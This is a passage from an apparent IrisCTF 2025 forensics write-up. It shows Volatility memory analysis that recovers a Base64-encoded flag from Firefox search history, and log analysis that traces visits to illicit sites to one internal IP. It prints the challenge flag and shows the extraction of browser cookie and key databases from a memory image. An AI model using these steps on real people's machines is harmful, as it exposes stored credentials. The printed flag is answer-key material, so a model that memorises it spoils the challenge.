class="line">Volatility 3 Framework 2.12.0</span><br><span class="line">Progress:  100.00PDB scanning finished                        </span><br><span class="line">PIDPPIDImageFileNameOffset(V)ThreadsHandlesSessionIdWow64CreateTimeExitTimeFile output</span><br><span class="line"></span><br><span class="line">40System0xe38cb727f6c098-N/AFalse2025-01-03 16:50:11.000000 UTCN/ADisabled</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">30364060firefox.exe0xe38cb818b50089-1True2025-01-03 16:55:40.000000 UTCN/ADisabled</span><br><span class="line">39683036firefox.exe0xe38cb75b908022-1True2025-01-03 16:55:41.000000 UTCN/ADisabled</span><br><span class="line">36243036firefox.exe0xe38cbb3800805-1True2025-01-03 16:55:41.000000 UTCN/ADisabled</span><br><span class="line">38283036firefox.exe0xe38cbb53980017-1True2025-01-03 16:55:43.000000 UTCN/ADisabled</span><br><span class="line">24203036firefox.exe0xe38cbb7118005-1True2025-01-03 16:55:44.000000 UTCN/ADisabled</span><br><span class="line">40763036firefox.exe0xe38cbb11608017-1True2025-01-03 16:55:45.000000 UTCN/ADisabled</span><br><span class="line">31323036firefox.exe0xe38cbb1e10805-1True2025-01-03 16:55:47.000000 UTCN/ADisabled</span><br><span class="line">712 628ApplicationFra 0xe38cbb5730801-1False2025-01-03 16:56:02.000000 UTCN/ADisabled</span><br><span class="line">50443036firefox.exe0xe38cbb7c88005-1True2025-01-03 16:56:43.000000 UTCN/ADisabled</span><br><span class="line">47723036firefox.exe0xe38cbb0d630018-1True2025-01-03 16:57:38.000000 UTCN/ADisabled</span><br><span class="line">13802856FTK Imager.exe 0xe38cbb82e80020-1False2025-01-03 17:02:19.000000 UTCN/ADisabled</span><br><span class="line">53243036firefox.exe0xe38cbba9408019-1True2025-01-03 17:09:52.000000 UTCN/ADisabled</span><br><span class="line">58043036firefox.exe0xe38cbb26108019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">23083036firefox.exe0xe38cbbb4408019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">27123036firefox.exe0xe38cbba1608019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">33283036firefox.exe0xe38cbb8c680019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">62563036firefox.exe0xe38cbb88480019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">52883036firefox.exe0xe38cbb8a980019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">56643036firefox.exe0xe38cbb7c908019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">51963036firefox.exe0xe38cbb8c080019-1True2025-01-03 17:09:56.000000 UTCN/ADisabled</span><br><span class="line">45083036firefox.exe0xe38cbbbe880019-1True2025-01-03 17:09:59.000000 UTCN/ADisabled</span><br><span class="line">43443036firefox.exe0xe38cbbbb808019-1True2025-01-03 17:10:00.000000 UTCN/ADisabled</span><br><span class="line">928     3036firefox.exe0xe38cbbc8c08019-1True2025-01-03 17:10:00.000000 UTCN/ADisabled</span><br><span class="line">7403036firefox.exe0xe38cbb89e40019-1True2025-01-03 17:10:01.000000 UTCN/ADisabled</span><br><span class="line">22523036firefox.exe0xe38cb7e2508019-1True2025-01-03 17:10:01.000000 UTCN/ADisabled</span><br><span class="line">29203036firefox.exe0xe38cbbc9e08019-1True2025-01-03 17:10:01.000000 UTCN/ADisabled</span><br><span class="line">31243036firefox.exe0xe38cbbca008019-1True2025-01-03 17:10:01.000000 UTCN/ADisabled</span><br><span class="line">71163036firefox.exe0xe38cb7e3268019-1True2025-01-03 17:10:01.000000 UTCN/ADisabled</span><br></pre></td></tr></table></figure><p>Among them, I noticed multiple firefox.exe processes running. I decided to dump all the files of the Firefox process with PID 3036:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f memdump.mem windows.dumpfiles --pid 3036</span><br></pre></td></tr></table></figure><p>This command yielded some DLLs and database files such as .db and .sqlite.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">permissions.sqlite  favicons.sqlite  cookies.sqlite  places.sqlite  formhistory.sqlite  storage.sqlite  cert9.db  key4.db </span><br><span class="line">domain_to_categories.sqlite  protections.sqlite  content-prefs.sqlite  bounce-tracking-protection.sqlite  data.sqlite</span><br></pre></td></tr></table></figure><h5 id="Exploring-the-Databases"><a href="#Exploring-the-Databases" class="headerlink" title="Exploring the Databases"></a>Exploring the Databases</h5><p>I analyzed these database files using DB Browser.</p><p>The places.sqlite and cookies.sqlite files contained search history data. Below is a snapshot of the data from places.sqlite:</p><p><img src="/images/posts/2025-irisctf/forensics/wd/places-sqlite.png" alt="Places.sqlite"></p><p>Initially, I suspected that the flag might have been uploaded to a file-sharing site like file.io. I explored the file.io site links but found no useful results.</p><h5 id="Further-Investigation"><a href="#Further-Investigation" class="headerlink" title="Further Investigation"></a>Further Investigation</h5><p>Next, I dumped the memory of the firefox.exe process for deeper analysis:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f memdump.mem windows.memmap --pid 3036 --dump</span><br></pre></td></tr></table></figure><p>This generated a pid.3036.dmp file. I ran strings on this file and noticed several links, which led me to Google Sites.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ strings pid.3036.dmp | grep <span class="string">&quot;https://www.google.com/search?&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;1&quot;</span>:&#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;https://www.google.com/search?client=firefox-b-d&amp;q=ftk+imager+portable&quot;</span>&#125;&#125;</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=ftk+imager+portable ftk imager portable - Google Search</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=ftk+imager+portable</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>Among the search queries, one appeared to be encoded in Base64.</p><h5 id="Decoding-the-Base64-String"><a href="#Decoding-the-Base64-String" class="headerlink" title="Decoding the Base64 String"></a>Decoding the Base64 String</h5><p>I decoded the Base64 string using the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0=&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">irisctf&#123;i_am_an_idiot_with_bad_memory&#125;</span><br></pre></td></tr></table></figure><p>Boom! We got our flag!!!</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;i_am_an_idiot_with_bad_memory&#125;</span></span><br></pre></td></tr></table></figure><h5 id="Alternate-Approach"><a href="#Alternate-Approach" class="headerlink" title="Alternate Approach"></a>Alternate Approach</h5><p>Later, I realized the same result could have been achieved by directly running strings with base64 of “irisctf{“ on the main memdump.mem file, which would have saved some effort. 😛</p><h3 id="Tracem1"><a href="#Tracem1" class="headerlink" title="Tracem1"></a>Tracem1</h3><h4 id="Challenge-Description-10"><a href="#Challenge-Description-10" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/forensics/tracem/desc.png" alt="Description"></p><p>Source File: <a href="/images/posts/2025-irisctf/forensics/tracem/tracem-1.tar.gz">tracem-1.tar.gz</a></p><h4 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h4><p>For this challenge, we need to identify the culprit. We were provided with a logs.json file packed with DHCP, DNS, Active Directory, and syslog logs.</p><ul><li>The DHCP Logs show the assignment of IP addresses.</li><li>The DNS Logs contain records of IP address resolutions for websites.</li><li>The Active Directory Logs include the names of the employees within the company.</li><li>The Syslog Logs are primarily focused on authentication and also contain the names of the employees.</li></ul><p>Let’s analyze the file:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;primary&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sourcetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 06:30:39.50&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 06:30:38.816111&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;protocol_stack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip:udp:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;transport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;udp&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;src_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.49.0.2&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;src_port&quot;</span><span class="punctuation">:</span> <span class="number">53</span><span class="punctuation">,</span> <span class="attr">&quot;dest_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.49.81.65&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dest_port&quot;</span><span class="punctuation">:</span> <span class="number">2561</span><span class="punctuation">,</span> <span class="attr">&quot;transaction_id&quot;</span><span class="punctuation">:</span> <span class="number">54938</span><span class="punctuation">,</span> <span class="attr">&quot;answers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AAAA&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;class&quot;</span><span class="punctuation">:</span> <span class="string">&quot;IN&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dropbox.com&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;addr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2620:100:6040:18::a27d:f812&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;primary&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sourcetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 06:30:39.69&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 06:30:38.819396&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;protocol_stack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip:udp:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;transport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;udp&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;src_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.33.0.2&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;src_port&quot;</span><span class="punctuation">:</span> <span class="number">53</span><span class="punctuation">,</span> <span class="attr">&quot;dest_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.33.81.223&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dest_port&quot;</span><span class="punctuation">:</span> <span class="number">10338</span><span class="punctuation">,</span> <span class="attr">&quot;transaction_id&quot;</span><span class="punctuation">:</span> <span class="number">8697</span><span class="punctuation">,</span> <span class="attr">&quot;answers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AAAA&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;class&quot;</span><span class="punctuation">:</span> <span class="string">&quot;IN&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hr.evil-insurance.corp&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;addr&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;primary&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sourcetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 06:30:39.40&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 06:30:38.959049&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;protocol_stack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip:udp:dns&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;transport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;udp&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;src_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.51.247.145&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;src_port&quot;</span><span class="punctuation">:</span> <span class="number">9037</span><span class="punctuation">,</span> <span class="attr">&quot;dest_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.51.0.2&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dest_port&quot;</span><span class="punctuation">:</span> <span class="number">53</span><span class="punctuation">,</span> <span class="attr">&quot;transaction_id&quot;</span><span class="punctuation">:</span> <span class="number">689</span><span class="punctuation">,</span> <span class="attr">&quot;queries&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AAAA&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;class&quot;</span><span class="punctuation">:</span> <span class="string">&quot;IN&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab.evil-insurance.corp&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>We can see references to many links accessed by different employees, along with their IP addresses and MAC addresses.</p><p>Since the challenge was related to computer networks, I started by checking all the URLs accessed by the employees.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep -o <span class="string">&#x27;&quot;name&quot;: *&quot;[^&quot;]*&quot;&#x27;</span> logs.json | sed -E <span class="string">&#x27;s/&quot;name&quot;: *&quot;([^&quot;]*)&quot;/\1/&#x27;</span></span><br></pre></td></tr></table></figure><p>So these were the urls:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">connectivitycheck.gstatic.com</span></span><br><span class="line"><span class="string">www.msftconnecttest.com</span></span><br><span class="line"><span class="string">time.windows.com</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">it.evil-insurance.corp</span></span><br><span class="line"><span class="string">evil-insurance.corp</span></span><br><span class="line"><span class="string">chat.evil-insurance.corp</span></span><br><span class="line"><span class="string">service.evil-insurance.corp</span></span><br><span class="line"><span class="string">hr.evil-insurance.corp</span></span><br><span class="line"><span class="string">gitlab.evil-insurance.corp</span></span><br><span class="line"><span class="string">files.evil-insurance.corp</span></span><br><span class="line"><span class="string">meetings.evil-insurance.corp</span></span><br><span class="line"><span class="string">guestportal.evil-insurance.corp</span></span><br><span class="line"><span class="string">sso.evil-insurance.corp</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">aftermarket.pl</span></span><br><span class="line"><span class="string">bp0.blogger.com</span></span><br><span class="line"><span class="string">copious-amounts-of-illicit-substances-marketplace.com</span></span><br><span class="line"><span class="string">breachforums.st</span></span><br><span class="line"><span class="string">smith-wesson.com</span></span><br><span class="line"><span class="string">bmj.com</span></span><br><span class="line"><span class="string">thedailybeast.com</span></span><br><span class="line"><span class="string">welt.de</span></span><br></pre></td></tr></table></figure><p>There were some safe sites, as well as sites related to the evil-insurance (EI) Corp Company.</p><p>Out of all the sites, I found the following to be very suspicious:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">copious-amounts-of-illicit-substances-marketplace.com</span></span><br><span class="line"><span class="string">breachforums.st</span></span><br></pre></td></tr></table></figure><p>Since these sites were also matching the keywords mentioned in the description, I proceeded to check who accessed both of these sites.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$strings</span> logs.json | grep -E <span class="string">&quot;copious-amounts-of-illicit-substances-marketplace.com|breachforums.st&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 06:30:18.99&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 06:30:18.347812&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.33.18.209&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 7419, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.33.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 45042, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;copious-amounts-of-illicit-substances-marketplace.com&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 06:30:19.21&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 06:30:18.572830&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.33.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.33.18.209&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 7419, <span class="string">&quot;transaction_id&quot;</span>: 45042, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;copious-amounts-of-illicit-substances-marketplace.com&quot;</span>, <span class="string">&quot;addr&quot;</span>: <span class="string">&quot;104.16.148.244&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 06:33:36.80&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 06:33:36.803488&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.33.18.209&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 52836, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.33.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 50295, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;breachforums.st&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 06:33:37.18&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 06:33:37.175597&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.33.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.33.18.209&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 52836, <span class="string">&quot;transaction_id&quot;</span>: 50295, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;breachforums.st&quot;</span>, <span class="string">&quot;addr&quot;</span>: <span class="string">&quot;185.129.102.136&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 06:50:51.87&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 06:50:51.748497&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.33.18.209&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 22966, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.33.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 33048, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;breachforums.st&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 06:50:52.14&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 06:50:52.021816&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.33.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.33.18.209&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 22966, <span class="string">&quot;transaction_id&quot;</span>: 33048, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;breachforums.st&quot;</span>, <span class="string">&quot;addr&quot;</span>: <span class="string">&quot;185.129.102.136&quot;</span>&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure><p>As expected, the same IP address (10.33.18.209) accessed both of these sites.</p><p>Let’s analyze the syslog:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;primary&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;udp:514&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sourcetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;syslog&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 04:58:36.95&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;_raw&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 04:58:35.622504||https://sso.evil-insurance.corp/idp/profile/SAML2/Redirect/SSO|/idp/profile/SAML2/Redirect/SSO|5b52053ac1ab1f4935a3d7d6c6aa4ff0|authn/MFA|10.33.18.209|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 